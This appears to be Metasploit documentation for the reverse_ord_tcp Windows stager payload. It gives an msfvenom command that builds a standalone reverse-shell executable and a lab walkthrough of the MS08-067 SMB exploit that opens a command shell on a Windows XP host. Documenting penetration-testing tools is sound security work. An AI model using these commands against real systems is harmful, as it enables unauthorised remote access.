# Windows Command Shell

Reverse Ordinal TCP Stager is an unique windows payload for Metasploit Framework.

It is really small (<100 bytes), it uses the existing ws2_32.dll in memory in connect and load the next stage of the payload. It provides a shell on the target machine which can be used to achieve almost anything on the target pc.

## Vulnerable Application

This Meterpreter payload is suitable for the following environments:

* Windows x86
* Windows x64

## Usage

### As a payload for an exploit:

To check its compatibility with an exploit, select the exploit in the msf console and type the ```info``` command. The output will be similar to:

```
msf5 payload(windows/shell/reverse_tcp) > info

       Name: Windows Command Shell, Reverse TCP Stager
     Module: payload/windows/shell/reverse_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 283
       Rank: Normal

Provided by:
  spoonm <spoonm@no$email.com>
  sf <stephen_fewer@harmonysecurity.com>
  hdm <x@hdm.io>
  skape <mmiller@hick.org>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port

Description:
  Spawn a piped command shell (staged). Connect back to the attacker
```


If the platform field includes Windows, then windows/shell/reverse_ord_tcp can be used as the
payload.

To use at as a payload for an exploit, use the following commands:

 1. In msfconsole, select an exploit module compatible with windows.
 2. Configure the options for that exploit.
 3. Then run the following command: ```set windows/shell/reverse_ord_tcp```
 4. Set the ```LHOST``` option, to be the IP address that the payload should connect to.
 5. Then run the command: ```exploit```.

If the exploit is successful, the payload will get executed.


### As a standalone executable

To use it as an executable, use the msfvenom tool. A typical example of doing this is as follows:


```
./msfvenom -p windows/shell/reverse_ord_tcp LHOST=192.168.23.1 LPORT=4444 -f exe -o /tmp/ordpayload.exe```
```

## Scenarios

The following commands are run on a Windows XP SP 2 English Machine:

```
msf exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_ord_tcp
payload => windows/shell/reverse_ord_tcp
msf exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.56.3
RHOST => 192.168.56.3
msf exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.56.3     yes       The target address
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell/reverse_ord_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.56.1     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf exploit(windows/smb/ms08_067_netapi) > exploit
```

The above commands will result into the following scenario, leading a shell
on the target machine:

```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.3:445 - Automatically detecting the target...
[*] 192.168.56.3:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] 192.168.56.3:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] 192.168.56.3:445 - Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.56.3
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.3:1034) at 2018-08-17 15:25:02 +0530
```

